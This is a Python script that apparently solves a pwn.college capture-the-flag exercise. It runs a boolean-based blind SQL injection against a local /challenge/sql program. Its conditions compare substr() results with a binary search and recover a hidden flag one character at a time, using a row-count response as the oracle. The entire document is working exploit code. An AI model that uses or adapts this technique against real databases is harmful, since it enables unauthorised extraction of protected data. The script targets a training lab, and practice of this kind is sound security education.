import subprocess
from concurrent.futures import ThreadPoolExecutor

flag = "pwn.college{"

def test_condition(condition):
    query = f"SELECT element FROM storage WHERE {condition}"
    process = subprocess.Popen(
        ['/challenge/sql'], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True
    )
    stdout, stderr = process.communicate(input=query)
    return "Got 1 rows" in stdout

def get_next_char(current_flag):
    pos = len(current_flag) + 1
    # We define the search space for the binary search
    low, high = 32, 126
    
    # We perform the binary search
    while low <= high:
        mid = (low + high) // 2
        # Check if the character is in the upper half
        condition = f"substr(element, {pos}, 1) > char({mid}) AND element GLOB '{current_flag}*'"
        
        if test_condition(condition):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)

# Using a ThreadPoolExecutor to run character searches if needed, 
# though for a single flag, a sequential binary search is already optimal.
def main():
    global flag
    print(f"Starting optimized threaded search...")
    
    # We keep the sequence logic here
    while not flag.endswith('}'):
        # For a single flag, we process one character at a time.
        # Threads are less useful here, but we use an executor to keep the pattern:
        with ThreadPoolExecutor(max_workers=1) as executor:
            future = executor.submit(get_next_char, flag)
            char = future.result()
            flag += char
            print(f"Current flag: {flag}")

    print(f"\nFinal Flag: {flag}")

if __name__ == "__main__":
    main()
